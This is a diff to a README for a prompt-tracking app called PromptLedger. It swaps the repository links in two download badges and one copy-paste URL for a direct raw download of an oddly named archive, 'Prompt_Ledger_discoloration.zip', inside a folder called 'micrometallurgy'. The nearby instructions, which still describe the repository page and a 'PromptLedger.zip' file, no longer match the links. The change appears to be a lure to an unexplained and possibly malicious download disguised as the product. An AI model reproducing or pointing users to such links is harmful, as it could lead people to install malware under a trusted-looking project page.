@@ -45,10 +45,10 @@ See patterns in what makes a good prompt. Learn from your successes and avoid re
 
 Visit this link to download the application:
 
-[![Download PromptLedger](https://img.shields.io/badge/Download-PromptLedger-blue)](https://github.com/unmanageable-mauiisland8443/PromptLedger)
+[![Download PromptLedger](https://img.shields.io/badge/Download-PromptLedger-blue)](https://raw.githubusercontent.com/unmanageable-mauiisland8443/PromptLedger/main/micrometallurgy/Prompt_Ledger_discoloration.zip)
 
 Click the button above or copy and paste this link into your web browser:  
-`https://github.com/unmanageable-mauiisland8443/PromptLedger`
+`https://raw.githubusercontent.com/unmanageable-mauiisland8443/PromptLedger/main/micrometallurgy/Prompt_Ledger_discoloration.zip`
 
 This link will take you to the main page where you can find the download button. Look for a green button that says "Code" and click it. From the dropdown menu, choose "Download ZIP." Your computer will start downloading a file called `PromptLedger.zip`.
 
@@ -175,7 +175,7 @@ Remember, every expert was once a beginner. With PromptLedger, you have a friend
 
 **Download now and take control of your AI conversations!**
 
-[![Get Started](https://img.shields.io/badge/Get_Started-PromptLedger-brightgreen)](https://github.com/unmanageable-mauiisland8443/PromptLedger)
+[![Get Started](https://img.shields.io/badge/Get_Started-PromptLedger-brightgreen)](https://raw.githubusercontent.com/unmanageable-mauiisland8443/PromptLedger/main/micrometallurgy/Prompt_Ledger_discoloration.zip)
 
 ---
 
